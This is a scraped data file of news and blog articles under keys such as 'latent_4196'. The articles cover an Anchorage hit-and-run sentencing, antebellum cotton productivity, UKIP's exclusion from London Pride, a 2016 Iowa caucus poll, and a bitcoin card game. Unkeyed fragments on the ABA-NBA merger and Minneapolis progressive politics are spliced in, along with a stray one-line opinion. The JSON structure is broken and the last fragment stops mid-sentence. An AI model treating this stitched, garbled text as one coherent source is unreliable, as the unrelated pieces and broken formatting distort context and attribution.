  "latent_4196": "The sentencing of Alexandra Ellis, the driver accused of killing bicyclist Jeff Dusenbury in a hit-and-run that shocked the city, began in an Anchorage courtroom Friday but remained unresolved as witnesses testified through the afternoon hearing.\n\nSuperior Court Judge Michael Wolverton said he would decide Monday when the sentencing hearing would resume.\n\nIn the Friday hearing, an accident investigator hired by the defense suggested that Dusenbury was speeding on his bicycle and that Ellis' vehicle was barely moving. But Dusenbury's friends and family ridiculed those conclusions.\n\nDusenbury had accumulated a broad circle of friends and colleagues through his biking and work at Food Services of America, and along with his family, some of them showed up for the hearing Friday.\n\nDusenbury was 51, married, and the father of a child when he was killed on July 19, 2014, when Ellis backed into him then left the scene of the accident, police said. Officers found Ellis at her home, less than a half-mile from where she hit Dusenbury; her blood alcohol content was 0.10 more than two hours after the accident, prosecutors said. The legal limit is 0.08.\n\nEllis, then 17, was charged as an adult with manslaughter and other crimes. She pleaded guilty to a reduced charge of criminally negligent homicide in May. A felony charge of leaving the scene of an accident without assisting an injured person was dismissed, which Dusenbury's family has expressed frustration over.\n\nAs a first-time felony offender, Ellis faces a maximum of three years for the criminally negligent homicide charge, though the parties agreed to recommend a one-year jail term.\n\nBicycling advocates have spoken out against the plea deal as a miscarriage of justice. But a jail term of about a year for teenage defendants who have killed people while driving is not without precedent.\n\nIn testimony Friday, the expert witness hired by Ellis' defense asserted Dusenbury himself was speeding on his bicycle and that the accident occurred when he crashed into Ellis' truck.\n\nDefense Attorney William Ingaldson called accident reconstruction expert Jay Smith as the first witness. Smith testified about his on-scene examination of the accident.\n\nPhotos of the scene were shown in the courtroom, including one of a mountain bike lying in the grass next to the road with debris scattered around it. Smith said the bike was constructed with lightweight carbon fiber and had narrow tires. He said the bike wouldn't perform well on 84th Avenue, where the fatal impact happened. The street has potholes and mixed paving, the photos showed.\n\nAudible sounds of exasperation came from Dusenbury's family when the question about the bike's performance was answered. Ellis sat straight-faced, swiveling slightly in her chair during portions of testimony.\n\nSmith said tire marks confirmed his estimate that Ellis was moving no faster than 11 mph. He said Dusenbury was traveling about 30 to 35 mph. Friends laughed at the estimation, which Smith admitted was not an exact science.\n\nHe based that speed on Dusenbury's injuries and the bike being in top gear, as well as the damage to the driver's side of Ellis' truck. Smith testified that Dusenbury struck the truck, which was turning at a 60 degree angle.\n\nDistrict Attorney Clint Campion asked Smith what other experts may testify as a reasonable range of speed. Smith responded that 35 mph would be the high end of Dusenbury's estimated speed.\n\nCampion also established Dusenbury had been bicycling two feet to the right of the center of the street.\n\n\"He was riding in the appropriate lane of travel?\" Campion asked.\n\nSmith said Dusenbury was.\n\nA short time later, Melissa Holder, Dusenbury's wife, fought back tears as she recalled the morning her husband died. She said they had planned to go vehicle shopping for their daughter and barbecue with friends to close the day.\n\n\"Never in my wildest dreams did I imagine his life would be over in less than an hour,\" Holder said.\n\nShe lamented that Dusenbury wouldn't be present at her daughter's wedding in November.\n\nEllis' choices were inexcusable, she said. Sentencing the 18-year-old to only a year in prison would send the wrong message to the community.\n\n\"It's hard for me to accept her remorse,\" Holder said.\n\nMike Vania, who described Dusenbury as his best friend, said his life will never be the same. He and Dusenbury both worked in sales, and exercise was their way to escape.\n\nFrom the time Ellis was charged with Dusenbury's death, Vania and others wanted a sentence that fit the crime, he said. But the court process has left them feeling bewildered and, more recently, outraged.\n\n\"The prosecution rolled over and offered a deal that amounted to a slap on the wrist,\" Vania said.\n\n\"The family is asking you (the judge) reject this plea agreement. There is no justice for Jeff in this agreement,\" he said.\n\nVania contended the defense attorneys were willing to smear Dusenbury to get Ellis a light sentence. He said the testimony about Dusenbury traveling up to 35 mph showed the defense knew nothing about cycling.\n\n\"(Dusenbury) was one mile into a 90-mile bike ride, for god's sake … Why would he be in full sprint in the beginning of this long trip?\" he said.\n\nA woman who witnessed the accident spoke before the court as well. Tina Adcox said the defense's arguments were wrong.\n\n\"There's no way (Ellis' truck) was coming at 11 miles per hour … The squealing of the (truck) coming so fast that it alerted me,\" Adcox said.",
  "latent_4337": "Summary : New cultivars of cotton led to an unprecedented rise in the productivity of US southern cotton in the 60 years before the American Civil War. The Economist magazine may have said some stupid things about the subject in its review of Edward Baptist’s book on slavery, but it was fundamentally right to question the claim that antebellum efficiency gains were due to slaves being worked ever harder by their masters. (Note : I have a follow-up post, “Baptism by Blood Cotton“, which critiques in detail the central claims of Baptist’s book. There is also a brief note on slaves-as-wealth in Piketty & Slave-Wealth.)\n\nI’ve said for a long time now that The Economist “newspaper” mostly produces glib, shallow hack pieces, despite somehow maintaining an august reputation to the contrary. Recently it published a review of The Half Has Never Been Told : Slavery and the Making of American Capitalism by historian Edward E. Baptist. In one sentence the reviewer used some vaguely injudicious language, and this caused outrage in the comments section and in social media. The Economist quickly “retracted” the review but quoted it in its entirety all the same. I reproduce the section which contains the economic-historical argument :\n\nRaw cotton was America’s most valuable export. It was grown and picked by black slaves. So Mr Baptist, an historian at Cornell University, is not being especially contentious when he says that America owed much of its early growth to the foreign exchange, cheaper raw materials and expanding markets provided by a slave-produced commodity. But he overstates his case when he dismisses “the traditional explanations” for America’s success: its individualistic culture, Puritanism, the lure of open land and high wages, Yankee ingenuity and government policies. Take, for example, the astonishing increases he cites in both cotton productivity and cotton production. In 1860 a typical slave picked at least three times as much cotton a day as in 1800. In the 1850s cotton production in the southern states doubled to 4m bales and satisfied two-thirds of world consumption. By 1860 the four wealthiest states in the United States, ranked in terms of wealth per white person, were all southern: South Carolina, Mississippi, Louisiana and Georgia. Mr Baptist cites the testimony of a few slaves to support his view that these rises in productivity were achieved by pickers being driven to work ever harder by a system of “calibrated pain”. The complication here was noted by Hugh Thomas in 1997 in his definitive history, “The Slave Trade”; an historian cannot know whether these few spokesmen adequately speak for all. Another unexamined factor may also have contributed to rises in productivity. Slaves were valuable property, and much harder and, thanks to the decline in supply from Africa, costlier to replace than, say, the Irish peasants that the iron-masters imported into south Wales in the 19th century. Slave owners surely had a vested interest in keeping their “hands” ever fitter and stronger to pick more cotton. Some of the rise in productivity could have come from better treatment. Unlike Mr Thomas, Mr Baptist has not written an objective history of slavery. Almost all the blacks in his book are victims, almost all the whites villains. This is not history; it is advocacy.\n\nI’ve italicised the part which incited the outrage, but the final sentence is apparently the real howler in the eyes of the offended.\n\nI’m more interested in the economics of the above claims. I haven’t read this just-published book, so I can only go by the review, and as far as I can tell neither Baptist nor the offended have disputed the reviewer’s characterisation of the book’s thesis.\n\nThe Economist‘s elf was lazily speculating, a priori, about what could have been the determinants of efficiency in southern cotton production. It’s possible the reviewer is familiar with some of the arguments and debates surrounding Time on the Cross : The Economics of American Slavery, one of whose many controversial arguments was that slaves were becoming ever more valuable property in the antebellum American South and were therefore better treated than commonly supposed. [Edit : Fogel restrictively argued, “The material (not psychological) conditions of slaves compared favourably with those free industrial workers”.] But I doubt that literature is known to the reviewer, because then he would have been familiar with recent research on the sources of increased efficiency of cotton agriculture in 1800-60.\n\nAccording to the paper by Alan Olmstead and Paul Rhode, “Biological Innovation and Productivity Growth in the Antebellum Cotton Economy” [published version], the labour productivity of southern cotton grew 2.3% per year in the period 1800-60 :\n\nStandard accounts treat the technology of cotton production as static following the invention and refinement of Eli Whitney’s 1793 saw gin. Given that cotton cultivation remained a hand labor task throughout the slavery period and that no machines comparable to the reaper gained acceptance, this view seems plausible at first glance. All early attempts to develop mechanical cotton harvesters failed. The stereotype of an “uninventive South” is reinforced by the region’s low level of patenting activity. Implicit in this treatment is the assumption that all Upland cotton was alike. But cotton was not cotton. The qualitative accounts of planter-historian B. C. L. Wailes, agronomist J. O. Ware, historian John Hebron Moore, and others, asserted that southern planters created superior cotton varieties that significantly increased cotton yields, fiber quality, and the amount of cotton that could be picked in a day. The surviving archival records of 142 plantations allow us to construct a panel dataset including 509 crop years and 704,800 daily observations of the cotton production activities of 6,200 individual enslaved African Americans. The data clearly document the revolution in cotton picking efficiency—between 1801 and 1862 the average amount of cotton picked per slave in a day quadrupled. This rapid growth in picking efficiency—2.3 percent per annum—was substantially faster than the advance in labor productivity in the overall economy. …Contemporaries, and many historians, viewed the introduction and improvement of large-boll cottons from Mexico as a revolutionary innovation that rivaled the importance of Whitney’s gin. We follow this lead by analyzing the creation and diffusion of Upland cotton varieties. Next, we introduce a new dataset drawn from the archival records of 142 plantations. These data show that the amount of Upland cotton the typical slave picked in a day increased approximately four times in the 60 years preceding the Civil War. We go on to explore a number of hypotheses for the increase in picking efficiency, concluding that improved cotton varieties likely accounted for most of the change. We further argue that our measured increase in picking efficiency captures only part of the impact of biological innovation on cotton production because the new varieties also offered higher yields and rendered higher quality fiber than most earlier cottons.\n\nThe conclusions about the growth of labour productivity are based on the following data :\n\nIn short, cotton output grew significantly faster than labour inputs, i.e., slave labour productivity was rising quite steadily. The bottom of the table displays the market prices of cotton and slaves, which serve as a check on the productivity observation. Cotton prices were falling but a major input in the production process, slaves, was getting more expensive. This fact is strongly consistent with rising labour productivity.\n\nPersonally I can’t believe 2.3% per annum growth in productivity over 60 years could possibly be achieved by something other than major technological change. 2.3% per year is huge. To put that in perspective, consider that output per worker in English arable agriculture rose ~1% per year in the period 1800-1850. [See Table 15, Broadberry et al.] Or consider Olmstead & Rhode’s claim (page 35) that the mechanical reaper increased the productivity of wheat harvest by 50-100%. That is puny compared with the quantum leap in cotton picking productivity : 2.3% over 60 years amounts to almost 400%. How the hell does one achieve a quadrupling of output per worker just by increased effort alone, no matter how coercively obtained ???\n\nOlmstead & Rhode attribute the productivity gain to the introduction of particular cultivars of the Mesoamerican cotton species G. hirsutum, more colloquially known as “upland cotton”. Its characteristics are well summarised by Stephen Yafa in Cotton: The Biography of a Revolutionary Fiber :\n\nStaple length in this mallow is everything. The difference between inch-long medium-length G. hirsutum fibers and those of G. barbadense, which reach two inches, is the difference between perfectly drinkable table wine and a celestial Chateau Lafite-Rothschild. By that standard, the Old World’s short-staple cottons represent jug brands—inferior by any measure. Once their bolls open, spiraling cotton fibers twist back and forth, interlink, and cling to one another, which greatly facilitates the spinning process. But short fibers—under an inch in length—easily break apart; they also hold less moisture and tend to be more brittle, producing coarser fabric. The Mayans and the Bahamian Arawaks that Columbus encountered were growing and spinning the two New World cotton species. Unlike their weaker Old World cousins, hirsutum and the elegant barbadense are botanical warriors and belong to a special type of hybrid called a tetraploid, meaning simply that all of the genetic structures of both parents are carried within the offspring—an unusual occurrence (most often only some of each genome shows up). As a result of their industrial-strength DNA, these tetraploids prove to be especially tough, successful, vigorous plants. They produce the hundreds of thousands of airy yet sturdy tubular cellulose fibers that lend themselves to textiles strong enough to withstand the abuses of human wear and tear.\n\nYafa further notes that “green-seeded upland would become the one that blanketed the American South” ; and today “it accounts for about 95 percent of all the cotton grown and used around the world”.\n\nOlmstead and Rhode devote several pages to the trial-and-error process by which various cultivars of G. hirsutum were carefully selected, hybridised (especially with a Mexican cultivar), and adapted to the soil and climactic conditions of the American south. (A more detailed literary account, full of observations by contemporaries on the importance of new cotton varieties, is found here.) They also document the failure of another promising cotton species G. barbadense, also known as “Sea Island cotton”, to take hold on account of its low yield.\n\nThe new Southern cultivars yielded more lint per boll and there were more bolls per plant. Not only that, some of the varieties also produced taller plants which were easier to pick. These photos show the dramatic difference that height could make (click to enlarge, source) :\n\nFor me the vastness of the efficiency gain alone speaks eloquently to some other factor besides ekeing more labour out of slaves until the pips squeaked. O & R nonetheless go through the motions and address the obvious alternate hypotheses for the increase in the cotton pick rate : (1) efficiencies of scale from the slave gang system ; (2) better management (including the possibility that slave owners are getting better at squeezing work out of slaves) ; and (3) the expansion of cotton production into western territories of the United States.\n\nFor the purposes of this blogpost the most important is #2 and O & R exploit a natural experiment in the daily picking rates of the high-yield Upland cotton cultivars versus the lower-yielding Sea Island cultivars :\n\nNote that the Y-axis has got a log-scale ; the differences in the growth of pounds picked per worker-day of the two cultivars are colossal. In view of the above, it’s difficult to believe the euphemistic “managerial efficiency” was driving the secular rise in the pick rate of Upland cotton.\n\nO & R also checked the improvements in yield on the same plantations over time before and after they switched from Sea Island to Upland. Unfortunately they produce no time series graphics for these observations, but they report large increases over time in the samples of plantations covered.\n\nFinally, the botanical-genetic-technological explanation of the efficiency gains in US cotton production better accounts for the dramatic conquest of the world market for raw cotton by growers of the American south toward the mid-19th century. American cotton had 80% of the world share. Why didn’t this new American technology get diffused earlier and faster ? The Upland cultivar was adapted to the geoclimactic conditions of the American south and could not be rapidly adapted by the other primary cotton-growing regions of the world, such as India, Egypt or the Caribbean. Britain, the premier producer and exporter of cotton textiles, directly controlled many of these regions, but its manufacturers chose to import primarily American cotton.\n\nSo, YES, The Economist was quite fatuous and grossly ignorant in tendering the flaccid hypothesis that slaves might have been better treated, as a first-order counterargument to the claim that slaves were driven ever harder. But it was perfectly reasonable in doubting the latter claim in the first place.\n\nAt his blog the political scientist Chris Blattman rightly chides The Economist for not bothering to know the literature on the subject. (His post has been reblogged at the The Washington Post.) But then instead of getting to the heart of the matter — the efficiency of antebellum cotton agriculture — Blattman digresses about the literature on the efficacy and effects of coerced labour, with one link and graphic after another proving…. definitely not that an intensified effort at coercion of labour can quadruple worker output over six decades in a very labour-intensive production system.\n\nOn Twitter Blattman uttered to me the truism that “technology and (coerced) labour are complements”, as though no one has ever before decomposed the sources of economic growth into labour inputs, capital inputs, technological change, etc. The complementarity is beside the point. The point is that driving slaves harder, alone, could not possibly have accounted for the massive productivity gain in cotton.\n\nPS — There were also some technological improvements in cotton agriculture unrelated to plant breeds that contributed to the efficiency of cotton production. Two most important are “scrapers” and machine seeders. But I do not stress those here. Also, the better soils of the more westerly lands in the “New South” were important.\n\nEDIT : I’m waiting for Edward Baptist’s book to come out on Kindle, but Google Books has some excerpts. Unless there’s more to it than pp 127-8, it would appear the author uses the Olmstead productivity data, but merely hints at the botanical argument and dismisses that with a wave of the hand. He makes it sound (at least in those pages) as though it were only a matter of a single variety, Petit Gulf, of Upland cotton. But the plant breeding issue is definitely much deeper and broader. From another paper by Olmstead & Rhode (O&R 2007):\n\nO&R 2007 also quotes from the plant breeding textbook, Breeding Field Crops, which indicates that the earliest cotton cultivars introduced to the American South,\n\n“…were largely mixed populations with varying amounts of cross-pollination and heterozygosity that gave them plasticity and potential for genetic change. They were tropical in origin, perennial, photoperiod-sensitive, and did not flower under the long days of the United States Cotton Belt. Yet, following generations of repeated selection, these initial stocks were molded into early maturing, photoperiod-insensitive cultivars adapted for production in the southern United States Cotton Belt. [from footnote 19] “The early history of American Upland cotton is complex due to the genetic diversity of the early cottons introduced into the southern states; the frequent occurrence of cross-pollination among the different types; and the rapid genetic adjustment in cotton to climatic differences and cultural practices in the southern states in comparison to the tropical climate and primitive cultural practices in the regions where the cottons originated. A major adjustment that had to be made was the adaptation to longer photoperiods. The adjustments were hastened by the contributions of large numbers of early cotton breeders who worked without the genetic guidelines available to cotton-breeders today…\n\nO&R 2007 continues :\n\n“Initial attempts to grow upland cotton in the areas that now constitute the United States faced severe difficulties. Success depended on finding a mutation/cross or introducing a variety with the appropriate photosensitivity characteristics. The varieties eventually prevailing in the United States typically flowered in early to mid-summer and began to reach maturity by the end of August or early September. “The process of molding upland cotton to the environment was repeated over and over again as new varieties were introduced and as cotton production moved into new areas. In Lebergott’s words it was a matter of “try and try again.”21 According to Ware, “The vast differences in climate and soil that obtain over the Cotton Belt undoubtedly brought about a kind of natural selection which eliminated many of the kinds that were tried, while others became adapted to the several conditions under which they were grown and selected over a period of years.”22 American upland cotton was relatively late to come onto the world market, but its characteristics made it ‘much more suitable, than any other kind, for general factory use’.”\n\nO&R 2007 goes into some detail on the plant-breeding aspect of the cotton cultivars. There’s definitely much more to it than just Petit Gulf.",

  "latent_4453": "The UK Independence Party (UKIP) has been officially banned from attending this year’s Gay Pride Parade in London, following a U-turn from event organisers.\n\nThe party’s LGBT* group, as well as the youth wing Young Independence had initially intended to send representatives to take part in the Pride march in London.\n\nBut following a campaign against the party by political groups and full-time, left-wing LGBT activists, it appears that the organisers have caved.\n\nThe latest person to come out against UKIP’s attendance is long-time LGBT campaign and presumed free-speech activist Peter Tatchell, who dictated today that it was “not appropriate” for either homosexual or straight members of UKIP to attend the march.\n\nA statement from the event organisers reads: “For this year we have reached the decision that UKIP’s application to join the Pride in London Parade, 27th June 2015, will be turned down.\n\n“This decision has been made after careful consultation in order to protect participants and ensure the event passes off safely and in the right spirit, it has not been made on a political basis.\n\n“We appreciate many in our community have strongly held views about UKIP, their policies and comments, but is undeniable that there are LGBT+ members of UKIP, including their MEP for Scotland, and it is important to remember that Pride in London aims to be an inclusive event.\n\n“However, of paramount concern to us is the experience of all participants at Pride, most especially the position we would be putting our volunteer stewards in.”\n\nThe MEP in question is Mr David Coburn, a gay man himself, though one who doesn’t subscribe to political correctness about the subject, or any others.\n\nThe organisers have claimed that they will be ‘turning down’ UKIP’s application, though Breitbart London understands that the application had already been accepted, and that this development is an about-face by the Pride organisers, after political lobbying and a campaign against the party.\n\nThe organisers may now face a challenge from UKIP, who could argue that the move breaches a contract the organisers have to run the event. A note on their website reads: “Within this contract we pledged to create a world-class, diverse and inclusive event that provides a platform for the LGBT+ community to celebrate and campaign; and raise money to assist charities and organisations that safeguard and promote the welfare and rights of the LGBT+ community.” Excluding UKIP may fall foul of their responsibilities towards diversity and inclusivity.\n\nOne LGBT member told Breitbart London: “Once again the LGBT lobby have said it’s great to be gay, but only if you have the right kind of views and are the right kind of gay. This is a sad day, but I hope it’ll bolster LGBT* in UKIP, help us to become more radical, and to be a home for LGBT people who do not feel they belong on the left”.\n\nUPDATE – An Official UKIP Statement:\n\nFlo Lewis, the Chair of LGBT* in UKIP said, “The Board of London Pride 2015 have not decided to reject our application. Instead they have decided to rescind the invitation under threats from and complaints by other members of the LGBT* community.\n\n“We should, I think, be very sorry that this decision has been made, equally we are sorry that the organising committee and Board of London Pride 2015 has been put under the sort of pressure it has over the past few days.\n\n“All people, regardless of creed, colour or sexual orientation, can find a home in UKIP. It is a sad day for diversity and freedom when these people are prohibited from expressing themselves as part of the wider community”.",

The news and stories that matter, delivered weekday mornings.\n\nJan. 30, 2016, 11:55 PM GMT / Updated Jan. 31, 2016, 5:05 PM GMT By Danny Freeman, Carrie Dann and Vaughn Hillyard\n\nDonald Trump has surged past Ted Cruz in Iowa, while Hillary Clinton is holding a three-point lead over Bernie Sanders, according to the final Des Moines Register/Bloomberg Politics poll before the Iowa caucuses.\n\nTrump captures the support of 28 percent of likely caucus-goers, compared to 23 percent for Cruz, 15 percent for Florida Sen. Marco Rubio and 10 percent for former neurosurgeon Ben Carson.\n\nOn the Democratic, the data shows Clinton up over Sanders 45 to 42 percent, with just three percent for former Maryland Gov. Martin O'Malley.\n\nThe survey from highly-respected pollster Ann Selzer comes just about 48 hours before voters will meet at the state's 1,681 precincts for Monday night's caucuses.\n\nThe Iowa poll is widely viewed as a \"gold standard\" in the industry because of its record of accurately predicting past contests. Selzer forsaw Barack Obama's victory over Hillary Clinton in the 2008 caucuses, and she pegged Rick Santorum's late surge over Mitt Romney in 2012.\n\nThe poll was conducted January 26-29, and the margin of error is four percentage points.\n\nThe GOP\n\nThe poll shows a continuing slide for Cruz, who bested Trump by 10 points in the same poll in December. In early January, he led the real estate mogul by three points.\n\nTrump's supporters are also the most set in their choice, with 71 percent saying their mind is made up to support him on Monday. That's compared to 61 percent for Cruz and 47 percent for Rubio.\n\nAs Cruz rose in the polls through December, Trump began launching attacks against the Texas senator, targeting his birth in Canada, questions over his support for a path to legal status for undocumented immigrants and criticism for taking out loans from Goldman Sachs and Citibank for his 2012 senate campaign.\n\nLast week, after Trump bailed on the GOP’s final Iowa debate, Cruz challenged Trump to a debate that would be \"90-minutes, Lincoln-Douglas, mano-a-mano, Donald and me.\"\n\nThe new poll shows that 24 percent of Republican caucus-goers approved of Trump skipping the debate, 29 percent disapproved, and 46 percent said that Trump's decision made no difference.\n\nCruz has taken hits over the past two weeks, starting with Iowa Gov. Terry Branstad suggesting Cruz would be “damaging” to the state because of his position on the Renewable Fuel Standard, which requires ethanol be used in the U.S. fuel supply.\n\nCruz has also taken consistent heat from the pro-ethanol group America’s Renewable Future, leading farmers to confront Cruz for his position on the issue at nearly each one of his campaign stops over the past month.\n\nIn a poll conducted by Ann Selzer’s polling firm in October, 61 percent of Republicans in the state said they would be more likely to back a candidate who favors growth in renewable fuels.\n\nAnd Ben Carson – who in mid-October led Trump by nine points in the poll – is still pulling significant support. Carson’s campaign has said the candidate needs to finish in the top four to continue beyond Iowa\n\nTrump’s ground game – a constant point of skepticism by outsiders – will be tested on Monday.\n\nThe Iowa Republican Party is preparing for record turnout – but the extent of the surge of caucus-goers is in question.\n\nRubio’s campaign, widely criticized for its lack of organization in the state through the summer and fall, increased its presence, along with Rubio himself, in the state over the final two months of the race.\n\nThe Democrats\n\nThe topline Iowa results for the Democratic race are largely consistent with the previous poll's findings, which showed Clinton leading Sanders by two points.\n\nUnlike in 2008, when a majority of participants in the caucuses attended for the first time, just a third of likely attendees in this survey are first-time caucus-goers. Those voters lean heavily towards Sanders.\n\nAnd more than eight-in-ten Clinton supporters say they have made up their minds to support her on Monday night.\n\nBoth Sanders and Clinton have been crisscrossing primarily the eastern part of the state nonstop in the final days in hopes of drumming up enthusiasm and support.\n\nAnd as the candidates careen toward 7pm CST Monday night, when doors will be shut for hopeful caucus-goers, their rhetorical punches have been coming at a faster pace.\n\nOn Thursday night in Burlington, Iowa, Sanders, who has vowed to keep his campaign focused on the “issues,” listed a number of policy positions where he differs from Clinton.\n\n“It is great to be for gay rights, after you insult the entire gay communtiy by supporting DOMA,” said Sanders then referring to President Bill Clinton’s signing of the Defense of Marriage Act with candidate Clinton’s support.\n\nOn Saturday, in response to one of the campaign's senior strategists asserting that Sanders has run the “most negative” Democratic primary campaign ever, Clinton told NBC’s Monica Alba that she didn’t disagree with that statement.\n\nClinton has furthermore been asserting that many of Sanders’ ideas are impractical, highlighting his desire to push for universal single-payer health care if elected president.\n\nThese battles of words have also led to a number of turnout battles as both candidates have held events in the same cities on the same nights.\n\nOn Friday evening, the former president and Secretary Clinton held an event in the Col Ballroom in Davenport in front of 1,500, which the Des Moines Register characterized as one of the “biggest, most boisterous crowds” the candidate has seen this cycle. Across town, Sanders and activist Cornel West commanded a raucous Danceland Ballroom of 1,000.\n\nOnly a few hours later, Sanders packed a room at the Grand River Center in Dubuque with 1,300 attendees all waving campaign-provided American flags, when earlier in the day, Clinton spoke to 460 people at the north eastern city’s Five Flags Center.\n\nClinton earned the Des Moines Register Editorial Board’s endorsement last week.\n\n“In the final analysis, Iowa Democrats will have to choose between the lofty idealism of Bernie Sanders and the down-to-earth pragmatism of Hillary Clinton,” read the endorsement.\n\nSince then, a number of newspaper endorsements have followed suit, including the New York Times’ editorial board Saturday morning.\n\nSanders has now incorporated a positive and encouraging line for his supporters firmly into his stump speech: “If voter turnout is high, we will likely win.”\n\nBut he often adds a caveat that if voter turnout is low, he will lose the Iowa caucuses.",

I mean, when that many women are coming forward against someone, you just know that they’re not making it up. And it’s a real shame that a man could take advantage of the trust of women like that.

  "latent_4558": "A bitcoin startup wants to bring collectible card games (CCG) into the block chain age with an online game called Deckbound.\n\nDeckbound is a lot like other collectible card games – the most well-known of which is Magic: The Gathering, which is played online and on tabletops. The difference is that each Deckbound card exists as a transaction on the block chain.\n\nThe Isle of Man-based maker of Deckbound, EVA Plexus, is run by founder Gareth Jenkins, who has run an independent game development studio in the past.\n\nJenkins said block chain-linked cards allow players to trade them without the involvement of the game-maker, harking back to when CCGs first came on the scene as purely paper-based games.\n\n“Because cards were physically printed, you ended up with all these interesting systems that exist in the communities around the cards. For example, most Magic [tournament] rules came from players themselves, not Wizards of the Coast,” he said, referring to the company that created Magic.\n\nJenkins said fusing cards to the block chain means that each card would then become a permanent digital object that would be independent of its maker.\n\n“By basing it on the block chain […] we provide a level of guarantee to players that if, for whatever reason, in two years our business goes bust, everything is still public,” he said.\n\nThis is a departure from the conventional way online CCGs are managed, where the publisher acts as the central authority issuing new cards, deciding how cards can be traded and ensuring that the systems are in place to sustain the game world.\n\nHe added:\n\n“In the digital space, you’re tied to using someone else’s system, you can’t come up with the rules yourself. It’s completely opaque.”\n\nBig money in digital card games\n\nDigital CCGs are proving to be major money-makers for big game publishers.\n\nHasbro, which owns Magic’s maker Wizards of the Coast, reported $1.3bn in sales from its game division in 2013, representing growth of 10% over the previous year. The games and toys giant doesn’t break out figures for individual titles, but singled out Magic for contributing to its revenue gains.\n\nMeanwhile, Activision Blizzard, which owns the hugely popular World of Warcraft and Diablo franchises, launched its own online CCG, Hearthstone, in March. The company said it expected Hearthstone to exceed $100m in revenues, with Blizzard Entertainment chief executive Michael Morhaime saying the title “has been exceeding all of our expectations”, in an August earnings call with investors.\n\nHow it works\n\nJenkins has had to perform some complicated manoeuvres to link Deckbound cards to the block chain. For starters, he built a system that allows various tags to be attached to a bitcoin transaction, called BitBind. The system can be thought of as a simplified implementation of coloured coins, Jenkins said.\n\nThe BitBind system is used by Deckbound to attach various card attributes to a given transaction, effectively turning that transaction into a Deckbound card.\n\n“BitBind allows us to follow things around the block chain […] it allows players to freely trade cards; it doesn’t involve us, but we still know where [the cards] are, and so on,” Jenkins said.\n\nBecause each Deckbound card is essentially a bitcoin transaction, it also has a nominal bitcoin value, which is a percentage of the price of that card. The first Deckbound cards are priced at $1 worth of bitcoin, so each card has a value of $0.25 worth of bitcoin.\n\nThe BitBind system sits on top of the block chain, so it doesn’t write any information to the bitcoin public ledger. It is currently hosted by Jenkins’ company and its accessible through an API. Jenkins said the plan is to make the project open-source and available to anyone to run in the long-term.\n\nTurning cards into investment assets\n\nDeckbound’s next link to the block chain is its crowdfunding scheme. Jenkins is trying to raise funds for the game by turning cards into return-yielding assets.\n\nInstead of issuing new cards and slapping a price tag on them, Deckbound cards are issued from a ‘genesis block’. Each block is released when it hits a funding target. Investors who fund the block then stand to earn a return as the card is traded among players, gaining or losing value.\n\nThe first block has raised 30.4 BTC, putting it at 41% of its funding target of 75 BTC. The minimum projected return, according to Deckbound’s website, is 130% of the principal invested.\n\nCollectible cards have long been traded on marketplaces, fetching sky-high prices. The most expensive Magic card on record sold on eBay last year for more than $27,000, while the most expensive Pokemon trading card was on the block for $100,000 last September.\n\nFundraising\n\nDeckbound is also selling cards ahead of its release in an ‘alpha’ stage of development this year. The game can be played for free with ‘Nomad’ cards supplied by the game-maker, but packs of cards can also be purchased, with prices starting at $5.\n\nAccording to Jenkins, 5,000 cards have already been sold, worth about 2.5 BTC in all.\n\n“The response we’ve had so far has been great,” he said.\n\nOne gaming enthusiast on Bitcointalk, who is a self-professed player of Magic and Hearthstone, had this to say about Deckbound’s concept:\n\n“I love these strategic card games […] I think with the right marketing, this could become huge!”\n\nPart of the reason Jenkins is bootstrapping the game is because he’s encountered difficulty finding investors who are comfortable both in the cryptocurrency world and in the gaming space – although failed exchange Mt Gox, notably, started life as a trading platform for Magic cards.\n\nJenkins described one conversation with a prominent Silicon Valley investor who was clued-in on bitcoin, but struggled to understand the market for online card games. Still, he said he was hopeful he would be in a better position to raise traditional funding if the game gets some traction with customers first.\n\nFeature image via Shutterstock",

He helped institute a more entertaining, high-scoring brand of basketball than that seen in the NBA, as well as an eye-catching red, white and blue ball, the three-point shot and an emphasis on marketing players with colorful nicknames like Julius “Dr. J” Erving and George “The Iceman” Gervin. Despite these popular innovations, the ABA was plagued by a series of bad business decisions, among them a failure to copyright the red, white and blue ball, which went on to sell wildly in the 1970s. The league also struggled to reach a mass audience, as only one of its cities was a top 20 American market. As a whole, the population in ABA cities was less than half that of the NBA cities, and although the underdog league was popular with what fans it did reach, in the end it could not make enough money to survive on its own.\n\nADVERTISEMENT Thanks for watching!

Plans were then made to dismantle three of the seven ABA franchises and incorporate their players into the NBA. According to the terms of the deal, the three teams not absorbed into the NBA would be paid a separately negotiated lump sum. One of the three teams, the Virginia Squires, went bankrupt before the merger, but the other two were rewarded with substantial payouts. The owner of the Kentucky Colonels, John Y. Brown Jr., received a payout of $3.3 million dollars, while the Silna brothers, owners of the Spirits of St. Louis, negotiated what many believe to be the best deal in sports history: They received $2.2 million dollars and 1/7 of a share of each of the four remaining ABA (now NBA) teams’ television rights in perpetuity. To date, they have received more than $168 million dollars from the NBA. The NBA’s overtures to buy them out of the merger deal have been politely refused.\n\nADVERTISEMENT Thanks for watching!

They also want council action on the rising cost of housing and for the city to lead the charge against climate change.\n\n“People are feeling power has betrayed their trust and it comes down to the word ‘progressive,’ ” said Alex Hoselton, one of the organizers of a mid-December caucus training event put on by Our Revolution, the national spinoff of the Bernie Sanders campaign. “It’s been thrown around, and it lost its value in this city.”\n\nAlready an island of blue in the red sea of the Upper Midwest, Minneapolis could double down on that status if riled up progressives prevail.\n\nNone of this is comforting to a business community that has limited ability to influence DFL endorsements and already feels beset by the council on paid sick leave, a higher minimum wage and the failed scheduling ordinance.\n\n“I think the concern is if some of these folks end up being successful electorally, will there be any room to have a dialogue?” said Steve Cramer, the president of the Downtown Council. “Will there be any room to understand different perspectives on what’s important for the city? I don’t know.”\n\nNo GOP members\n\nMinneapolis hasn’t had a Republican council member since 1998, and DFL control of the city is broken only by the Green Party’s Cam Gordon, among the most progressive members.\n\nWithin City Hall there are stark divisions, however. Council President Barb Johnson and Goodman, who have both been in office since 1998, can usually get the necessary seven votes for their initiatives, while more progressive members such as Lisa Bender and Elizabeth Glidden often struggle to get to five.\n\nActivists in the city want to flip that dynamic.\n\nNeighborhoods Organizing for Change (NOC), a progressive group based in north Minneapolis, is forming a political action committee this year and will endorse candidates, behind whom it will throw fundraising support, organizers and promotional power. There will be a formal screening process, but NOC will favor candidates who support a $15 minimum wage, greater police accountability and alternative forms of policing, and protecting the environment with an eye toward racial justice.\n\nThe Our Revolution caucus training, which attracted 150 people to the Solar Arts Building in northeast Minneapolis, was aimed at the city’s April 4 